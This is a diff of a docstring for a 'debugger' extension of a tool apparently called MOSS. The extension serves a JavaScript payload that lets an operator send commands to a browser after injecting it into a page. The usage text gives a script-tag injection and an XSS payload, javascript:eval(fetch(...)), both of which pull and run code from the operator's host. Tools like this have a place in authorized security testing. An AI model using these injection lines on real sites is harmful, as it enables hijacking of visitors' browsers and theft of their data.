@@ -3,13 +3,21 @@ ext/debugger.py
 
 Interactive JS Debugging Agent for MOSS.
 
-Serves a JS payload for browser injection that executes commands
-received from a TUI prompt and returns results.
+Serves a JS payload for browser injection that executes JS commands
+received from a TUI prompt and returns results. Optionally integrates
+with prompt_toolkit for history and smoother (async) output.
 
 Usage:
     moss -e debugger -p 8000
-    # Inject into target page: <script src="http://IP:8000/debugger/{RANDOM}"></script>
-    # Type JS commands at the debug> prompt
+
+    Then find a HTML injection: <script src="http://IP:8000/debugger/{RANDOM}"></script>
+    
+    Or an XSS: javascript:eval(fetch("http://IP:8000/debugger/{RANDOM}"))
+
+CLI flags:
+    --debugger-path PATH        URL path for the JS payload (use {RANDOM} for random segment, default: /debugger/{RANDOM})
+    --debugger-id-length N      Length of the random path segment (default: 8)
+    --debugger-no-input         Disable the TUI input thread (for testing)
 """
 
 from contextlib import nullcontext
